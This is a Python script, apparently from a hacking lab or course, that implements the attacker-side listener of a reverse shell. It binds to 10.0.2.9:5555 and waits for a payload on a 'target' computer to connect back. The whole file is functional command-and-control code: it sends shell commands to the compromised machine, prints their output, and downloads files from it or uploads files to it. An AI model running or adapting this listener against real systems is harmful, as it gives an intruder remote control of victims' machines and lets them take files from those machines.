"""Import socket library to make connection between two different machines over the internet"""
import os
import socket
import json

"""Specify CONSTANTS for script"""
HOST_IP = "10.0.2.9"  # Host IP Address to make connection
PORT = 5555  # Port to make connection


# Create function to communicate with the target computer
def target_communication(ip_address):
	while True:
		command = input(f"* Shell~{ip_address}: ")  # Create a dialog with host to communicate back to target
		reliable_send(data=command)  # Send function with command variable back to target computer
		if command == "quit":  # Break while loop if host wants to quit the connection
			break
		elif command[:3] == "cd ":
			pass
		elif command == "clear":
			os.system("clear")
		elif command[:9] == "download ":
			download_file(file_name=command[9:])
		elif command[:7] == "upload ":
			upload_file(file_name=command[7:])
		else:
			# Receive results from target computer and print to terminal
			result = reliable_recv()
			print(result)


# Function to send data parameter to target
def reliable_send(data):
	json_data = json.dumps(data)  # Variable of json dumps method of the command issued to the target
	target.send(json_data.encode())  # Encode data prior to sending


# Function to receive data back from target and decode
def reliable_recv():
	data = ""
	while True:
		try:
			# Receive the target data in 1024 bit size chunk, decode it, and strip it the back end
			data += target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue


# Create a download function
def download_file(file_name):
	with open(file_name, "wb") as f:
		target.settimeout(1)  # Need to set a timeout
		chunk = target.recv(1024)  # Receive chunks of data
		# While host is still receiving data chunks this will be True and will continue to receive data
		while chunk:
			f.write(chunk)
			try:
				chunk = target.recv(1024)
			except socket.timeout as e:
				break
		target.settimeout(None)  # Removes timeout placed above


# Function to upload files to the target computer
def upload_file(file_name):
	with open(file_name, "rb") as f:
		target.send(f.read())


"""Initialize a socket object.
AF_INET --> Make a connection over IPV4
SOCK_STREAM --> Use TCP Connection"""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

"""Bind the IP Address and Port"""
sock.bind((HOST_IP, PORT))

"""Listen for connections from payload"""
print("[+] Listening for incoming connections...")
sock.listen(5)  # Listen for up to 5 different connections

"""Once the target connects back we need to store that information into variables"""
target, ip = sock.accept()  # Will store the socket object in the first variable and its IP address in the second
print(f"[+] Target connected from: {ip}")

target_communication(ip_address=ip)
